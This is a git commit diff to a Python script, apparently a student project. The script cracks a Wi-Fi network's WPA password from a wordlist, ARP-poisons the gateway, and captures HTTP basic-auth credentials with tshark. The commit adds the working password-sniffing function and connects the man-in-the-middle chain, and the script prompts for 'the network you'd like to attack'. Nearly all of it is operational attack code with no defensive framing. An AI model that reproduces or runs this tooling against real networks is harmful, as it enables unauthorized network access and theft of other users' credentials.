a01d3c77fab93e6887789db38a3781fa25bebeba
Pranav Arora <pranav.arora@utexas.edu>
2019-12-04 20:16:46 -0600

    sniff

--- source.py
+++ source.py
@@ -15,14 +15,16 @@ def crackWPA(essid, dictFile):
     with open(WIFITE_PASSWORDS_FILE, "r") as passwords:
         for line in passwords.readlines():
             if '"key":' in line:
-                print("Password for network {} is {}\n\n".format(essid,line.split()[-1][1:-2]))
+                print(line.split()[-1][1:-2])
                 return line.split()[-1][1:-2]
 
 def connectToNetwork(essid, password):
-    print("connecting to network")
-    os.system("sudo ifconfig {} down".format(INTERFACE_NAME))
-    os.system("sudo iwconfig {} mode managed".format(INTERFACE_NAME))
-    os.system("sudo ifconfig {} up".format(INTERFACE_NAME))
+    # subprocess.Popen(["nmcli", "d", "wifi", "connect", essid, "password", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE).wait()
+    # input("")
+    # print("connecting to network")
+    # os.system("sudo ifconfig {} down".format(INTERFACE_NAME))
+    # os.system("sudo iwconfig {} mode managed".format(INTERFACE_NAME))
+    # os.system("sudo ifconfig {} up".format(INTERFACE_NAME))
     #os.system("sudo nmcli d wifi connect Vic password praetorian")
     #subprocess.Popen(["sudo", "nmcli", "d", "wifi", "connect", essid, "password", password]).wait()
 
@@ -34,26 +36,24 @@ def getGatewayIP():
                 return line.split()[2]
         raise Exception("Gateway IP not found.")
 
-def sniffTraffic():
-    # Log traffic to a file (i.e. dsniff -w dumpfile.pcap)
-    pass
-
-def parsePasswords():
-    # Parse log file for plaintext passwords
-    pass
-
 def arpPoison(interface_name, host):
     arpSpoofProc = subprocess.Popen(["arpspoof", "-i", interface_name, host], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     return arpSpoofProc
+
+def sniffPasswords():
+    return subprocess.Popen(["tshark", "-ni", INTERFACE_NAME, "-T", "fields", "-e", "http.authbasic", "-Y", '"http.authbasic'])
 
 if __name__ == "__main__":
     setup()
     essid = input("Enter the name of the network you'd like to attack:")
     password = crackWPA(essid, DICT_FILE)
-    connectToNetwork(essid, password)
-    input("Please connect to the network using the password. You can connect in your network settings or run this command in another terminal:\n nmcli d wifi connect \"{}\" password {}\nPress enter once you are connected.".format(essid, password))
+    input("Password found! Connect to '{}' with password '{}' and press enter when ready".format(essid, password))
+    # connectToNetwork(essid, password)
+    print("ARP Poisoning...")
     gatewayIP = getGatewayIP()
-    arpSpoofProc = arpPoison(INTERFACE_NAME, gatewayIP)
-    sniffTraffic()
-    parsePasswords()
+    arpSpoofProc = arpPoison(monitorModeInterface, gatewayIP)
+    print("Sniffing passwords...")
+    sniffProc = sniffPasswords()
+    input("Press enter to stop sniffing")
+    sniffProc.terminate()
     arpSpoofProc.terminate()
